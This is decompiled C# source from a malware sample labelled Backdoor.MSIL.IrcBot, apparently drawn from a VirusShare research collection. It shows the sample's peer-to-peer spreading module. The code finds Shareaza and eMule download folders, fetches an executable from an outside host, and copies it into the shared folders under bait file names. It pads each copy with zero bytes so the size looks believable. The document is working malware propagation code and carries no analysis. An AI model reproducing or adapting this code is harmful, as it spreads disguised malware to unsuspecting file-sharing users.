// Decompiled with JetBrains decompiler
// Type: Realtek.P2P
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Reflection;

namespace Realtek
{
  internal class P2P
  {
    public static void ShareazaStart()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", false);
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      WebClient webClient = new WebClient();
      string str1 = new Random().Next(100000).ToString() + "sys.exe";
      if (registryKey == null)
        return;
      StreamReader streamReader = new StreamReader(executingAssembly.GetManifestResourceStream("Realtek.List.txt"));
      string str2 = streamReader.ReadLine();
      Program.Writer.WriteLine(Program.MessageGreen + "Shareaza found // Spread ok");
      for (; str2 != null; str2 = streamReader.ReadLine())
      {
        object obj = registryKey.GetValue("CollectionPath");
        if (!System.IO.File.Exists(obj.ToString() + "\\" + str2 + ".exe"))
        {
          webClient.DownloadFile("http://www.share-finder.com/tachatte/p2p.exe", Path.GetTempPath() + str1);
          System.IO.File.Copy(Path.GetTempPath() + str1, obj.ToString() + "\\" + str2 + ".exe", true);
          FileStream fileStream = System.IO.File.OpenWrite(obj.ToString() + "\\" + str2 + ".exe");
          long num1 = fileStream.Seek(0L, SeekOrigin.End);
          Decimal num2 = (Decimal) (Convert.ToInt32(str2.Length) * 10485);
          while ((Decimal) num1 < num2)
          {
            ++num1;
            fileStream.WriteByte((byte) 0);
          }
          fileStream.Close();
        }
      }
      streamReader.Close();
    }

    public static void EmuleStart()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal).Replace("Documents", "Downloads\\eMule\\Incoming\\");
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      WebClient webClient = new WebClient();
      string str1 = new Random().Next(100000).ToString() + "tempp.exe";
      if (!Directory.Exists(path))
        return;
      StreamReader streamReader = new StreamReader(executingAssembly.GetManifestResourceStream("Realtek.List.txt"));
      string str2 = streamReader.ReadLine();
      Program.Writer.WriteLine(Program.MessageGreen + "eMule found // Spread ok");
      for (; str2 != null; str2 = streamReader.ReadLine())
      {
        if (!System.IO.File.Exists(path + "\\" + str2 + ".exe"))
        {
          webClient.DownloadFile("http://www.share-finder.com/tachatte/p2p.exe", Path.GetTempPath() + str1);
          System.IO.File.Copy(Path.GetTempPath() + str1, path + "\\" + str2 + ".exe", true);
          FileStream fileStream = System.IO.File.OpenWrite(path + "\\" + str2 + ".exe");
          long num1 = fileStream.Seek(0L, SeekOrigin.End);
          Decimal num2 = (Decimal) (Convert.ToInt32(str2.Length) * 10485);
          while ((Decimal) num1 < num2)
          {
            ++num1;
            fileStream.WriteByte((byte) 0);
          }
          fileStream.Close();
        }
      }
      streamReader.Close();
    }
  }
}
